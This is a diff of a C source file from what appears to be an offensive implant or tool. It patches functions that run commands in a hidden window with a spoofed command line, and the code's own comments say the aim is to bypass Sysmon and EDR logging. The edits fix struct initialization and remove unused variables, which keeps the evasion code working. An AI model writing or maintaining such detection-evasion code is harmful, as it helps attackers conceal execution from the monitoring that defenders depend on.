@@ -28,11 +28,12 @@ void replaceArgumentsWithSpaces(const char *original, char *modified) {
 // Execute a command with cmdline evasion to bypass sysmon/EDR logging
 // Returns TRUE on success, FALSE on failure
 BOOL executeCommandWithEvasion(const char *command) {
-    BOOL status = FALSE;
     wchar_t *realCmdlineW = NULL;
     wchar_t *spoofedCmdlineW = NULL;
-    STARTUPINFOEX si = { sizeof(si) };
+    STARTUPINFOEX si = {{0}};
     PROCESS_INFORMATION pi = {0};
+    
+    si.StartupInfo.cb = sizeof(STARTUPINFO);
 
     if (!command || strlen(command) == 0) {
         return FALSE;
@@ -41,6 +42,8 @@ BOOL executeCommandWithEvasion(const char *command) {
     // Configure STARTUPINFO to hide window
     si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
     si.StartupInfo.wShowWindow = SW_HIDE;
+    si.StartupInfo.lpReserved = NULL;
+    si.lpAttributeList = NULL;
 
     // Create spoofed cmdline (everything after first space becomes spaces)
     char spoofedCmdline[MAX_PATH];
@@ -121,10 +124,9 @@ cleanup:
 // Execute a command with cmdline evasion and capture output
 // Returns dynamically allocated string with output (caller must free), or NULL on failure
 char* executeCommandWithOutput(const char *command) {
-    BOOL status = FALSE;
     wchar_t *realCmdlineW = NULL;
     wchar_t *spoofedCmdlineW = NULL;
-    STARTUPINFOEX si = { sizeof(si) };
+    STARTUPINFOEX si = {{0}};
     PROCESS_INFORMATION pi = {0};
     HANDLE hReadPipe = NULL, hWritePipe = NULL;
     SECURITY_ATTRIBUTES sa = {0};
@@ -132,6 +134,8 @@ char* executeCommandWithOutput(const char *command) {
     char *buffer = NULL;
     DWORD totalBytesRead = 0;
     DWORD bytesRead = 0;
+    
+    si.StartupInfo.cb = sizeof(STARTUPINFO);
 
     if (!command || strlen(command) == 0) {
         return NULL;
